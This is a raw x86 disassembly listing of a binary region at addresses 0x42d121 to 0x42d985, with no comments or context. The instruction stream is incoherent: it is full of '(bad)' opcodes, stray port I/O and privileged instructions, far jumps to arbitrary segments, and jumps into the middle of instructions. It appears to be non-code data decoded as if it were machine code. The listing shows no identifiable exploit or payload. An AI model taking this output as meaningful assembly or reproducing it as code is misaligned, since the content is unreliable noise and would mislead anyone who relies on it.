  42d121:	rcr    BYTE PTR [edi+edi*8-0x16],cl
  42d125:	iret   
  42d126:	fs (bad) 
  42d128:	call   0xe44230f7
  42d12d:	mov    edi,0xb4deff52
  42d132:	dec    ebx
  42d133:	(bad)  
  42d134:	fsubr  QWORD PTR [ebp-0x5b2900b5]
  42d13a:	dec    ebp
  42d13b:	call   edx
  42d13d:	fwait
  42d13e:	push   ecx
  42d13f:	dec    esi
  42d141:	xchg   ebx,eax
  42d142:	push   ecx
  42d143:	dec    ebx
  42d145:	mov    DWORD PTR [ecx-0x1],edx
  42d148:	mov    DWORD PTR [edx+0x76c3ff50],0x6dc0ff4c
  42d152:	inc    edi
  42d153:	(bad)  
  42d154:	mov    ebp,0xa7ff4263
  42d159:	push   ecx
  42d15a:	aaa    
  42d15b:	call   DWORD PTR [edi+0x4eff4470]
  42d161:	into   
  42d162:	xchg   bh,bh
  42d164:	inc    esp
  42d165:	ror    BYTE PTR [edi+0x7cc63aff],cl
  42d16b:	inc    DWORD PTR [ecx-0x32]
  42d16e:	jg     0x42d16f
  42d170:	inc    eax
  42d171:	(bad)  
  42d172:	cmp    edi,0x47
  42d175:	shr    BYTE PTR [edi+edi*8+0x54],1
  42d179:	leave  
  42d17a:	pop    edx
  42d17b:	push   DWORD PTR [ebp+0x64]
  42d17e:	das    
  42d17f:	stos   DWORD PTR es:[edi],eax
	...
  42d18c:	xchg   edx,eax
  42d18d:	cmp    DWORD PTR [edi],esp
  42d18f:	mov    dh,0x78
  42d191:	aaa    
  42d192:	and    eax,0x257751ff
  42d197:	dec    DWORD PTR [ebx]
  42d199:	mov    dl,0xe
  42d19b:	call   DWORD PTR [ecx+0x78]
  42d19e:	sub    edi,edi
  42d1a0:	mov    bl,BYTE PTR [ecx+0x2f]
  42d1a3:	call   DWORD PTR [ecx-0x6500d19c]
  42d1a9:	outs   dx,DWORD PTR ds:[esi]
  42d1aa:	xor    edi,edi
  42d1ac:	mov    dl,BYTE PTR [edx+edi*1+0x48ad7eff]
  42d1b3:	push   DWORD PTR [edi-0x3b00bb69]
  42d1b9:	sahf   
  42d1ba:	cmp    eax,0x44bfdfff
  42d1bf:	(bad)  
  42d1c0:	out    dx,eax
  42d1c1:	xlat   BYTE PTR ds:[ebx]
  42d1c2:	push   edi
  42d1c3:	push   ecx
  42d1c5:	fstp   QWORD PTR [ebp-0x1]
  42d1c8:	repnz loopne 0x42d22e
  42d1cb:	push   esp
  42d1cd:	in     al,0x67
  42d1cf:	push   ebp
  42d1d1:	in     al,0x69
  42d1d3:	push   ebp
  42d1d5:	in     eax,0x67
  42d1d7:	push   ebp
  42d1d9:	jecxz  0x42d23f
  42d1db:	push   ebx
  42d1dd:	loopne 0x42d240
  42d1df:	push   edx
  42d1e1:	fsub   QWORD PTR [esi-0x1]
  42d1e4:	out    dx,al
  42d1e5:	fnstenv [edx-0x1]
  42d1e8:	jmp    0x42d1bc
  42d1ea:	ins    DWORD PTR es:[edi],dx
  42d1eb:	jmp    edi
  42d1ed:	enter  0xff5c,0xe2
  42d1f1:	mov    ebp,0xb2deff4f
  42d1f6:	dec    ebp
  42d1f7:	(bad)  
  42d1f8:	fisubr DWORD PTR [ecx-0x5f2a00b0]
  42d1fe:	push   ebx
  42d1ff:	call   ecx
  42d201:	cwde   
  42d202:	push   ebp
  42d203:	dec    esp
  42d205:	lea    edx,[ebx-0x1]
  42d208:	enter  0x5285,0xff
  42d20c:	les    edi,FWORD PTR [edx+0x4d]
  42d20f:	inc    ecx
  42d211:	jo     0x42d25d
  42d213:	(bad)  
  42d214:	mov    esi,0xa8ff4467
  42d219:	dec    edi
  42d21a:	xor    eax,0x38549cff
  42d21f:	jmp    FWORD PTR [esi-0x4e]
  42d222:	imul   edi,edi,0x47
  42d225:	(bad)  
  42d226:	xchg   edx,eax
  42d227:	inc    DWORD PTR [ebx-0x34]
  42d22a:	xchg   bh,bh
  42d22c:	cmp    ecx,ebp
  42d22e:	jge    0x42d22f
  42d230:	aas    
  42d231:	sar    BYTE PTR [esi-0x1],1
  42d234:	push   esp
  42d235:	shl    DWORD PTR [ebp-0x1],cl
  42d238:	push   edi
  42d239:	rcr    DWORD PTR [edx-0x1],0x7f
  42d23d:	push   ebp
  42d23e:	sub    al,0x61
	...
  42d24c:	xchg   edi,eax
  42d24d:	cmp    al,0x28
  42d24f:	jae    0x42d2cd
  42d251:	cmp    al,0x27
  42d253:	call   DWORD PTR [ebx+0x7b]
  42d256:	sub    edi,edi
  42d258:	ldmxcsr DWORD PTR [ebx]
  42d25b:	call   FWORD PTR [edi+eiz*4]
  42d25e:	sbb    al,0xff
  42d260:	cmp    edx,DWORD PTR [eax-0x63c400db]
  42d266:	sub    bh,bh
  42d268:	aaa    
  42d269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d26a:	sub    eax,0x2fb92cff
  42d26f:	push   DWORD PTR [edx]
  42d271:	(bad)  
  42d272:	cmp    edi,edi
  42d274:	cmp    DWORD PTR [eax-0x513f00af],0x56
  42d27b:	dec    ebx
  42d27d:	lods   eax,DWORD PTR ds:[esi]
  42d27e:	dec    ebx
  42d27f:	jmp    ebp
  42d281:	iret   
  42d282:	push   esi
  42d283:	push   esi
  42d285:	call   0xed3bd1f4
  42d28a:	jo     0x42d28b
  42d28c:	cli    
  42d28d:	out    dx,al
  42d28e:	js     0x42d28f
  42d290:	sti    
  42d291:	icebp  
  42d292:	jl     0x42d293
  42d294:	cli    
  42d295:	out    dx,eax
  42d296:	ja     0x42d297
  42d298:	stc    
  42d299:	in     eax,dx
  42d29a:	jae    0x42d29b
  42d29c:	clc    
  42d29d:	jmp    0xe639d20e
  42d2a2:	ins    DWORD PTR es:[edi],dx
  42d2a3:	push   edx
  42d2a5:	fbstp  TBYTE PTR [eax-0x1]
  42d2a8:	out    dx,eax
  42d2a9:	fsubr  DWORD PTR [ebx-0x1]
  42d2ac:	jmp    0x51c3:0xe4ff5bce
  42d2b3:	jmp    eax
  42d2b5:	mov    eax,0xafdcff51
  42d2ba:	push   ebx
  42d2bb:	call   esi
  42d2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2be:	push   ebp
  42d2bf:	call   ecx
  42d2c1:	fwait
  42d2c2:	push   edi
  42d2c3:	dec    ebp
  42d2c5:	xchg   ecx,eax
  42d2c6:	push   esi
  42d2c7:	dec    edx
  42d2c9:	mov    BYTE PTR [ebp-0x1],dl
  42d2cc:	lds    edi,FWORD PTR [esi+0x50]
  42d2cf:	inc    edx
  42d2d1:	je     0x42d31e
  42d2d3:	(bad)  
  42d2d4:	mov    edi,0xb5ff466a
  42d2d9:	pop    ecx
  42d2da:	cmp    al,0xff
  42d2dc:	popf   
  42d2dd:	dec    esi
  42d2de:	xor    edi,edi
  42d2e0:	xchg   BYTE PTR [eax-0x1dab0099],ch
  42d2e6:	fwait
  42d2e7:	call   DWORD PTR [edx-0x2a]
  42d2ea:	xchg   esp,eax
  42d2eb:	(bad)  
  42d2ec:	ds int3 
  42d2ee:	cmp    edi,0xff7aca3d
  42d2f4:	push   esi
  42d2f5:	shl    DWORD PTR [edi-0x1],cl
  42d2f8:	pop    edi
  42d2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2fa:	dec    esi
  42d2fb:	sti    
  42d2fc:	xchg   DWORD PTR [esi+0x2b],ecx
  42d2ff:	sbb    eax,DWORD PTR [eax]
	...
  42d309:	add    BYTE PTR [eax],al
  42d30b:	add    BYTE PTR [ebp-0x78f1d4c1],bl
  42d311:	inc    ebx
  42d312:	sub    eax,0x296b58f7
  42d317:	call   DWORD PTR [ebx]
  42d319:	mov    bl,0x18
  42d31b:	call   FWORD PTR [eax]
  42d31d:	mov    esi,0xb917ff20
  42d322:	push   ds
  42d323:	call   FWORD PTR [edi]
  42d325:	stos   BYTE PTR es:[edi],al
  42d326:	push   ds
  42d327:	jmp    DWORD PTR [ebx]
  42d329:	stos   DWORD PTR es:[edi],eax
  42d32a:	and    edi,edi
  42d32c:	sub    DWORD PTR [ecx-0x35cd00d4],edi
  42d332:	cmp    edi,edi
  42d334:	cmp    eax,0x7cff4bd5
  42d339:	shr    DWORD PTR [edi+edi*8-0x33],cl
  42d33d:	ret    
  42d33e:	imul   edi,edi,0xff54c6d9
  42d344:	imul   esp
  42d346:	jne    0x42d347
  42d348:	cld    
  42d349:	cmc    
  42d34a:	cmp    edi,0xff8ef7fc
  42d350:	cld    
  42d351:	not    DWORD PTR [edi+edi*8-0x690905]
  42d358:	cli    
  42d359:	hlt    
  42d35a:	xchg   edi,edi
  42d35c:	cli    
  42d35d:	icebp  
  42d35e:	jge    0x42d35f
  42d360:	cli    
  42d361:	in     eax,dx
  42d362:	je     0x42d363
  42d364:	mul    esi
  42d366:	push   0xffffffff
  42d368:	repnz frstor [ebx-0x1]
  42d36c:	out    dx,al
  42d36d:	rcr    BYTE PTR [edx-0x1],cl
  42d370:	call   0xe342283d
  42d375:	mov    ebp,0xb2ddff54
  42d37a:	push   esp
  42d37b:	call   edi
  42d37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d37e:	push   edi
  42d37f:	call   edx
  42d381:	lahf   
  42d382:	pop    ecx
  42d383:	dec    esi
  42d385:	xchg   esp,eax
  42d386:	pop    ecx
  42d387:	dec    edx
  42d389:	mov    edx,DWORD PTR [esi-0x1]
  42d38c:	mov    BYTE PTR [ecx+0x77c3ff52],0x4c
  42d393:	inc    eax
  42d395:	ins    BYTE PTR es:[edi],dx
  42d396:	dec    eax
  42d397:	(bad)  
  42d398:	mov    eax,0x9bff3e5c
  42d39d:	push   ebx
  42d39e:	xor    eax,0x6eb97dff
  42d3a3:	jmp    DWORD PTR [eax-0x16]
  42d3a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3a7:	jmp    DWORD PTR [ebx-0x22]
  42d3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3ab:	call   DWORD PTR [ecx-0x2d]
  42d3ae:	mov    ?,edi
  42d3b0:	inc    ebx
  42d3b1:	int3   
  42d3b2:	jle    0x42d3b3
  42d3b4:	dec    esp
  42d3b5:	into   
  42d3b6:	jno    0x42d3b7
  42d3b8:	imul   edi,DWORD PTR [ecx+0x3a],0xffffffd4
	...
  42d3d0:	xchg   edx,eax
  42d3d1:	dec    edi
  42d3d2:	xor    edx,ebp
  42d3d4:	pop    ebp
  42d3d5:	je     0x42d405
  42d3d7:	call   DWORD PTR [ebx]
  42d3d9:	mov    ah,0x19
  42d3db:	call   FWORD PTR [esi]
  42d3dd:	leave  
  42d3de:	daa    
  42d3df:	call   FWORD PTR [esi]
  42d3e1:	(bad)  
  42d3e2:	sub    bh,bh
  42d3e4:	and    esi,DWORD PTR [ebx-0x52d500db]
  42d3ea:	and    eax,0x2fb92eff
  42d3ef:	(bad)  
  42d3f0:	cmp    ebx,ecx
  42d3f2:	inc    edx
  42d3f3:	inc    DWORD PTR [ecx-0x25]
  42d3f6:	push   edx
  42d3f7:	call   DWORD PTR [edi+eiz*8+0x75]
  42d3fb:	(bad)  
  42d3fc:	mov    esp,0xd7ff9bdb
  42d401:	retf   0xff6e
  42d404:	jecxz  0x42d3d9
  42d406:	push   bx
  42d409:	jmp    0xff9c:0xfafdff7f
  42d410:	std    
  42d411:	sti    
  42d412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d413:	(bad)  
  42d414:	cld    
  42d415:	cli    
  42d416:	lods   al,BYTE PTR ds:[esi]
  42d417:	(bad)  
  42d418:	sti    
  42d419:	stc    
  42d41a:	sahf   
  42d41b:	(bad)  
  42d41c:	sti    
  42d41d:	test   DWORD PTR [ebp-0x7f0c0501],0x6fecf9ff
  42d427:	push   ebp
  42d429:	loop   0x42d48f
  42d42b:	push   eax
  42d42d:	fcomp  DWORD PTR [esi-0x1]
  42d430:	jmp    0x58c2:0xe5ff5acd
  42d437:	(bad)  
  42d438:	fidiv  WORD PTR [eax+ebx*2+0x59aad9ff]
  42d43f:	call   esp
  42d441:	mov    eax,ds:0x97cfff5c
  42d446:	pop    edx
  42d447:	dec    ebx
  42d449:	lea    ebx,[eax-0x1]
  42d44c:	enter  0x5382,0xff
  42d450:	les    edi,FWORD PTR [ecx+0x4e]
  42d453:	(bad)  
  42d454:	mov    edi,0xaaff476b
  42d459:	push   esi
  42d45a:	aaa    
  42d45b:	call   FWORD PTR [edi-0x6f00cbb1]
  42d461:	mov    WORD PTR [ebx-0x1],ss
  42d464:	outs   dx,BYTE PTR ds:[esi]
  42d465:	in     al,dx
  42d466:	lods   al,BYTE PTR ds:[esi]
  42d467:	jmp    FWORD PTR [ecx-0x1a]
  42d46a:	mov    ah,0xff
  42d46c:	dec    ebx
  42d46d:	aad    0x8c
  42d46f:	inc    DWORD PTR [ebp+ecx*8+0x7e]
  42d473:	inc    DWORD PTR [esi-0x41]
  42d476:	popa   
  42d477:	push   DWORD PTR [edi+0x54]
  42d47a:	sub    DWORD PTR [edx+0x0],esi
	...
  42d48d:	add    BYTE PTR [eax],al
  42d48f:	add    BYTE PTR [ebp+0x43833450],dl
  42d495:	test   DWORD PTR [ecx],esp
  42d497:	(bad)  
  42d498:	adc    esi,DWORD PTR [edx-0x34da00e8]
  42d49e:	sub    al,0xff
  42d4a0:	shl    BYTE PTR es:0x38ca26ff,1
  42d4a7:	jmp    FWORD PTR [eax]
  42d4a9:	mov    esi,0xbe30ff2d
  42d4ae:	cs (bad) 
  42d4b0:	cmp    ecx,edx
  42d4b2:	dec    edx
  42d4b3:	dec    DWORD PTR [esi-0x20]
  42d4b6:	jge    0x42d4b7
  42d4b8:	pop    esi
  42d4b9:	out    0x9a,eax
  42d4bb:	(bad)  
  42d4bc:	jns    0x42d4ab
  42d4be:	mov    eax,0xbbe9c8ff
  42d4c3:	(bad)  
  42d4c4:	fcmovnu st,st(4)
  42d4c6:	xchg   ebp,eax
  42d4c7:	(bad)  
  42d4c8:	(bad)  
  42d4ca:	push   0xffffffff
  42d4cc:	out    dx,eax
  42d4cd:	out    0x8f,eax
  42d4cf:	push   esp
  42d4d1:	out    dx,al
  42d4d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4d3:	push   edx
  42d4d5:	in     eax,dx
  42d4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4d7:	push   edi
  42d4d9:	rep stos DWORD PTR es:[edi],eax
  42d4db:	(bad)  
  42d4dc:	cld    
  42d4dd:	cli    
  42d4de:	mov    ds:0x8af7fbff,eax
  42d4e3:	(bad)  
  42d4e4:	cli    
  42d4e5:	icebp  
  42d4e6:	ja     0x42d4e7
  42d4e8:	mul    esi
  42d4ea:	addr16 push ecx
  42d4ed:	fsub   QWORD PTR [ecx-0x1]
  42d4f0:	in     al,dx
  42d4f1:	rcr    BYTE PTR [esi-0x1],1
  42d4f4:	in     eax,0xc3
  42d4f6:	pop    ebx
  42d4f7:	(bad)  
  42d4f8:	fistp  QWORD PTR [eax-0x542600a5]
  42d4fe:	pop    ebx
  42d4ff:	call   esp
  42d501:	mov    ds:0x9acfff5e,eax
  42d506:	pop    ebp
  42d507:	dec    ebx
  42d509:	(bad)  
  42d50a:	pop    ecx
  42d50b:	dec    eax
  42d50d:	test   DWORD PTR [ebp-0x1],edx
  42d510:	lds    edi,FWORD PTR [edx+0x50]
  42d513:	jmp    FWORD PTR [esi-0x6400c19f]
  42d519:	pop    ebp
  42d51a:	cmp    bh,bh
  42d51c:	xchg   esi,eax
  42d51d:	mov    dl,BYTE PTR [edx-0x1]
  42d520:	popf   
  42d521:	jne    0x42d570
  42d523:	call   DWORD PTR [ebp+0x5dff6890]
  42d529:	jmp    0x42d4d6
  42d52b:	jmp    DWORD PTR [edi-0x4f]
  42d52e:	jne    0x42d52f
  42d530:	jno    0x42d4cd
  42d532:	pop    esi
  42d533:	jmp    DWORD PTR [ecx+0x7c]
  42d536:	cmp    esi,esi
  42d538:	js     0x42d57e
  42d53a:	and    eax,0x10
	...
  42d553:	add    BYTE PTR [edi+0x68],ch
  42d556:	sub    ebp,edx
  42d558:	adc    edi,DWORD PTR [ecx-0x2dd500e4]
  42d55e:	xor    bh,bh
  42d560:	cs aam 0x3d
  42d563:	jmp    FWORD PTR [edx*8-0x33d600b7]
  42d56a:	cmp    eax,0x41ca33ff
  42d56f:	(bad)  
  42d570:	cmp    eax,0x50ff4bca
  42d575:	fnstcw WORD PTR [edi+edi*8+0x65]
  42d579:	out    0xa8,al
  42d57b:	(bad)  
  42d57c:	js     0x42d569
  42d57e:	mov    dh,0xff
  42d580:	mov    eax,ds:0xbdffccf2
  42d585:	repnz into 
  42d587:	(bad)  
  42d588:	(bad)  
  42d58a:	mov    esp,0x93d6deff
  42d58f:	jmp    ebx
  42d591:	fistp  QWORD PTR [ecx-0x55211a01]
  42d597:	push   esi
  42d599:	repz mov cl,0xff
  42d59c:	cli    
  42d59d:	mul    BYTE PTR [esi-0x700a0601]
  42d5a3:	(bad)  
  42d5a4:	stc    
  42d5a5:	icebp  
  42d5a6:	jp     0x42d5a7
  42d5a8:	stc    
  42d5a9:	jmp    0xde36d51a
  42d5ae:	(bad)  
  42d5af:	(bad)  
  42d5b0:	in     al,dx
  42d5b1:	shl    BYTE PTR [eax-0x1],cl
  42d5b4:	out    0xc4,al
  42d5b6:	pop    esp
  42d5b7:	jmp    ecx
  42d5b9:	mov    ecx,0xaddaff5d
  42d5be:	pop    esi
  42d5bf:	call   ebp
  42d5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5c2:	pusha  
  42d5c3:	call   eax
  42d5c5:	call   0xff5c:0x90ccff5e
  42d5cc:	enter  0x5585,0xff
  42d5d0:	les    edi,FWORD PTR [ecx+0x4e]
  42d5d3:	jmp    DWORD PTR [ebx-0x5f00c5a4]
  42d5d9:	mov    dl,BYTE PTR [ecx-0x1]
  42d5dc:	pop    edi
  42d5dd:	jmp    0x9edad570
  42d5e2:	outs   dx,BYTE PTR ds:[esi]
  42d5e3:	call   FWORD PTR [esi+0x79ff435e]
  42d5e9:	stos   DWORD PTR es:[edi],eax
  42d5ea:	jb     0x42d5eb
  42d5ec:	mov    DWORD PTR [edi+0x4c],ebp
  42d5ef:	dec    DWORD PTR [ebp-0x7d00c29f]
  42d5f5:	dec    ecx
  42d5f6:	sub    DWORD PTR [esi+0x0],edx
	...
  42d614:	nop
  42d615:	push   esp
  42d616:	xor    al,0x8c
  42d618:	xor    ch,BYTE PTR [ecx-0x2ad801dc]
  42d61e:	xor    bh,bh
  42d620:	fiadd  DWORD PTR ss:[ebx-0x1]
  42d624:	xor    eax,0x2dff4ed8
  42d629:	ror    BYTE PTR [ecx-0x1],cl
  42d62c:	xor    al,0xd3
  42d62e:	pop    eax
  42d62f:	(bad)  
  42d630:	cmp    edx,ebp
  42d632:	pusha  
  42d633:	dec    DWORD PTR [eax-0x30]
  42d636:	pop    esi
  42d637:	push   DWORD PTR [ebp-0x26]
  42d63a:	xchg   ebx,eax
  42d63b:	jmp    FWORD PTR [esi-0x3600441e]
  42d641:	in     al,dx
  42d642:	sar    edi,cl
  42d644:	mov    ebx,0xb2ffd4f2
  42d649:	hlt    
  42d64a:	aam    0xff
  42d64c:	into   
  42d64d:	hlt    
  42d64e:	sar    edi,cl
  42d650:	call   0xe742ad48
  42d655:	fbstp  TBYTE PTR [ebx-0x64211801]
  42d65b:	jmp    esp
  42d65d:	fstp   QWORD PTR [edx+0x7fd7e3ff]
  42d663:	push   ebx
  42d665:	jmp    0xeb3dd5e2
  42d66a:	outs   dx,BYTE PTR ds:[esi]
  42d66b:	push   esp
  42d66d:	fbld   TBYTE PTR [ebp-0x1]
  42d670:	in     eax,dx
  42d671:	shl    DWORD PTR [edx-0x1],cl
  42d674:	out    0xc6,eax
  42d676:	pusha  
  42d677:	jmp    eax
  42d679:	mov    ecx,0xaedaff5f
  42d67e:	pusha  
  42d67f:	call   ebp
  42d681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d682:	popa   
  42d683:	call   eax
  42d685:	call   0xff5b:0x91cdff60
  42d68c:	leave  
  42d68d:	xchg   BYTE PTR [ebp-0x1],dl
  42d690:	les    edi,FWORD PTR [eax+edx*2-0x1]
  42d694:	stos   BYTE PTR es:[edi],al
  42d695:	ins    DWORD PTR es:[edi],dx
  42d696:	inc    edi
  42d697:	call   DWORD PTR [edx+0x64ff71ba]
  42d69d:	repnz stos BYTE PTR es:[edi],al
  42d69f:	call   FWORD PTR [esi-0x69009d76]
  42d6a5:	inc    edi
  42d6a6:	xor    edi,edi
  42d6a8:	mov    es,WORD PTR [esi+0x31]
  42d6ab:	inc    DWORD PTR [esi-0x7a00cfb7]
  42d6b1:	ds sub ah,dh
  42d6b4:	cdq    
  42d6b5:	inc    esi
  42d6b6:	xor    al,0x16
	...
  42d6d8:	jp     0x42d74d
  42d6da:	xor    dl,bh
  42d6dc:	and    dh,cl
  42d6de:	sub    bh,bh
  42d6e0:	cmp    ebx,esi
  42d6e2:	dec    edx
  42d6e3:	(bad)  
  42d6e4:	cmp    al,0xda
  42d6e6:	push   eax
  42d6e7:	push   DWORD PTR [eax]
  42d6e9:	int3   
  42d6ea:	dec    eax
  42d6eb:	push   DWORD PTR [edx]
  42d6ed:	retf   
  42d6ee:	push   eax
  42d6ef:	(bad)  
  42d6f0:	cmp    dl,dl
  42d6f2:	push   esi
  42d6f3:	inc    DWORD PTR [ecx+edx*8+0x5b]
  42d6f7:	call   FWORD PTR [ebp-0x38007239]
  42d6fd:	shl    BYTE PTR [edi+edi*8-0x2c133b],1
  42d704:	mov    eax,0xa5ffd8f2
  42d709:	lock sar edi,1
  42d70c:	mov    ebx,0xe0ffdbf4
  42d711:	out    0xc2,eax
  42d713:	(bad)  
  42d714:	(bad)  
  42d716:	mov    edi,?
  42d718:	loopne 0x42d6f0
  42d71a:	xchg   ebp,eax
  42d71b:	(bad)  
  42d71c:	fsubrp st(3),st
  42d71e:	mov    dh,0xff
  42d720:	(bad)  
  42d722:	mov    edi,edi
  42d724:	cmc    
  42d725:	jmp    0x42d79e
  42d727:	(bad)  
  42d728:	cld    
  42d729:	in     eax,dx
  42d72a:	outs   dx,BYTE PTR ds:[esi]
  42d72b:	push   esp
  42d72d:	fisub  WORD PTR [ebp-0x1]
  42d730:	in     al,dx
  42d731:	shl    DWORD PTR [ecx-0x1],cl
  42d734:	out    0xc5,eax
  42d736:	popa   
  42d737:	jmp    ecx
  42d739:	mov    ecx,0xafdbff61
  42d73e:	(bad)  
  42d73f:	call   ebp
  42d741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d742:	(bad)  
  42d743:	call   ecx
  42d745:	fwait
  42d746:	pusha  
  42d747:	dec    ebp
  42d749:	xchg   ecx,eax
  42d74a:	pop    ebx
  42d74b:	dec    ecx
  42d74d:	xchg   BYTE PTR [esi-0x1],dl
  42d750:	les    edi,FWORD PTR [edx+0x4f]
  42d753:	jmp    FWORD PTR [ecx-0x5800b896]
  42d759:	mov    ds,WORD PTR [esi-0x1]
  42d75c:	adc    esi,0xffffff90
  42d75f:	call   DWORD PTR [edi-0x6c00af8a]
  42d765:	dec    esp
  42d766:	xor    edi,edi
  42d768:	xchg   ebx,eax
  42d769:	pop    ebp
  42d76a:	cmp    bh,bh
  42d76c:	add    DWORD PTR [esi+0x2e],0xfffffffe
  42d770:	lea    esi,[ebx]
  42d772:	and    eax,0x61
	...
  42d797:	add    BYTE PTR [edi+0x5b414166],bl
  42d79d:	xchg   ebp,eax
  42d79e:	xor    cl,dh
  42d7a0:	and    al,0xd3
  42d7a2:	xor    al,0xff
  42d7a4:	aaa    
  42d7a5:	rol    BYTE PTR [edi+edi*8+0x30],1
  42d7a9:	ret    0xff43
  42d7ac:	xor    ebp,eax
  42d7ae:	dec    ebx
  42d7af:	push   DWORD PTR [esi+eax*8]
  42d7b2:	inc    ebp
  42d7b3:	inc    DWORD PTR [ecx-0x30]
  42d7b6:	pop    ecx
  42d7b7:	dec    DWORD PTR [edi-0x4a006b32]
  42d7bd:	shr    BYTE PTR [esi-0x3d166501],cl
  42d7c3:	jmp    DWORD PTR [edx-0x4d002a0e]
  42d7c9:	icebp  
  42d7ca:	xlat   BYTE PTR ds:[ebx]
  42d7cb:	(bad)  
  42d7cc:	mov    esi,0xd8ffdef5
  42d7d1:	icebp  
  42d7d2:	sar    bh,cl
  42d7d4:	xlat   BYTE PTR ds:[ebx]
  42d7d5:	jmp    0xe517d79b
  42d7da:	mov    ecx,0xb7e3e1ff
  42d7df:	(bad)  
  42d7e0:	(bad)  
  42d7e2:	js     0x42d7e3
  42d7e4:	cmc    
  42d7e5:	jmp    0xf03ed757
  42d7ea:	imul   edi,edi,0xfffffff7
  42d7ed:	in     al,0x66
  42d7ef:	(bad)  
  42d7f0:	out    dx,al
  42d7f1:	shl    DWORD PTR [ecx-0x1],1
  42d7f4:	out    0xc3,eax
  42d7f6:	(bad)  
  42d7f7:	jmp    eax
  42d7f9:	mov    bh,0x63
  42d7fb:	(bad)  
  42d7fc:	fldcw  WORD PTR [ebx+eiz*2+0x64a5d5ff]
  42d803:	call   ecx
  42d805:	call   0xff5a:0x8ecbff60
  42d80c:	enter  0x5383,0xff
  42d810:	mov    ebx,0xa5ff4972
  42d815:	arpl   WORD PTR [edx-0x1],ax
  42d818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d819:	xchg   DWORD PTR [eax-0x1],ebx
  42d81c:	push   0xffffffd9
  42d81e:	cmp    edi,0xff65a481
  42d824:	cwde   
  42d825:	xchg   edx,eax
  42d826:	push   ebp
  42d827:	call   DWORD PTR [esi-0x6e00a365]
  42d82d:	dec    edx
  42d82e:	xor    ecx,esp
  42d830:	cdq    
  42d831:	cmp    eax,0x22b
	...
  42d85a:	add    BYTE PTR [eax],al
  42d85c:	popf   
  42d85d:	jne    0x42d8a5
  42d85f:	add    BYTE PTR [ebp-0x5a],0x2a
  42d863:	stc    
  42d864:	and    eax,0x33ff2ec0
  42d869:	mov    BYTE PTR [ebx-0x1],0x3a
  42d86d:	rcr    BYTE PTR [eax-0x1],1
  42d870:	ss (bad) 
  42d872:	dec    esp
  42d873:	(bad)  
  42d874:	cmp    al,dh
  42d876:	push   ecx
  42d877:	dec    DWORD PTR [edi-0x27]
  42d87a:	jg     0x42d87b
  42d87c:	arpl   si,bx
  42d87e:	mov    ds:0xa0d5b7ff,eax
  42d883:	jmp    FWORD PTR [esi-0x64004b1f]
  42d889:	icebp  
  42d88a:	aam    0xff
  42d88c:	mov    cl,0xf3
  42d88e:	fdiv   st(7),st
  42d890:	mov    esp,0xb8ffe6f6
  42d895:	mul    ebp
  42d897:	inc    eax
  42d899:	repz loopne 0x42d89b
  42d89c:	(bad)  
  42d89e:	popf   
  42d89f:	(bad)  
  42d8a0:	fcmovnb st,st(7)
  42d8a2:	popa   
  42d8a3:	(bad)  
  42d8a4:	stc    
  42d8a5:	in     al,dx
  42d8a6:	imul   edi,edi,0xff67e9f9
  42d8ac:	cmc    
  42d8ad:	jecxz  0x42d913
  42d8af:	push   edx
  42d8b1:	fisub  DWORD PTR [edx-0x1]
  42d8b4:	jmp    0x62b7:0xe0ff62ca
  42d8bb:	(bad)  
  42d8bc:	fisubr DWORD PTR [edx-0x5d29009e]
  42d8c2:	arpl   di,di
  42d8c4:	rcr    DWORD PTR [eax+0x74b2ff5f],1
  42d8ca:	dec    edx
  42d8cb:	push   DWORD PTR [eax-0x5000b38d]
  42d8d1:	jno    0x42d91e
  42d8d3:	jmp    DWORD PTR [ebx+0x78ff4b78]
  42d8d9:	les    esi,FWORD PTR [eax-0x1]
  42d8dc:	inc    edx
  42d8dd:	jmp    0xe1abd864
  42d8e2:	mov    bh,bh
  42d8e4:	jl     0x42d8b9
  42d8e6:	js     0x42d8e7
  42d8e8:	jp     0x42d86d
  42d8ea:	inc    edi
  42d8eb:	repnz xchg edi,eax
  42d8ed:	dec    esp
  42d8ee:	and    BYTE PTR ss:[eax],al
	...
  42d91d:	add    BYTE PTR [eax],al
  42d91f:	add    BYTE PTR [ebx+0x3b9e467e],bl
  42d925:	stos   DWORD PTR es:[edi],eax
  42d926:	sub    bh,ah
  42d928:	cs into 
  42d92a:	inc    DWORD PTR ds:[esp+ebx*8+0x5f]
  42d92f:	(bad)  
  42d930:	cmp    cl,cl
  42d932:	dec    esp
  42d933:	push   DWORD PTR [esi]
  42d935:	mov    eax,0xcd3aff3e
  42d93a:	pusha  
  42d93b:	dec    DWORD PTR [ecx-0x2a]
  42d93e:	xchg   bh,bh
  42d940:	rol    ah,0x83
  42d943:	dec    ecx
  42d945:	les    edi,FWORD PTR [edx-0x1]
  42d948:	xchg   esi,eax
  42d949:	out    0xb6,al
  42d94b:	call   DWORD PTR [ebx-0x73003012]
  42d951:	in     al,dx
  42d952:	enter  0xaaff,0xf3
  42d956:	fdiv   st(7),st
  42d958:	(bad)  
  42d959:	out    0xb7,eax
  42d95b:	inc    edi
  42d95d:	lods   al,BYTE PTR ds:[esi]
  42d95e:	pop    edx
  42d95f:	jmp    ebx
  42d961:	into   
  42d962:	push   edi
  42d963:	(bad)  
  42d964:	out    dx,al
  42d965:	fstp   DWORD PTR [ebp-0x1]
  42d968:	jmp    0x5bcd:0xe7ff5ed4
  42d96f:	(bad)  
  42d970:	in     eax,dx
  42d971:	rcr    DWORD PTR [edi-0x1],1
  42d974:	in     al,dx
  42d975:	into   
  42d976:	arpl   di,di
  42d978:	out    0xc1,al
  42d97a:	arpl   di,di
  42d97c:	fnsave [edx-0x5e29009e]
  42d982:	pusha  
  42d983:	inc    edi
  42d985:	lea    edx,[edi-0x1]
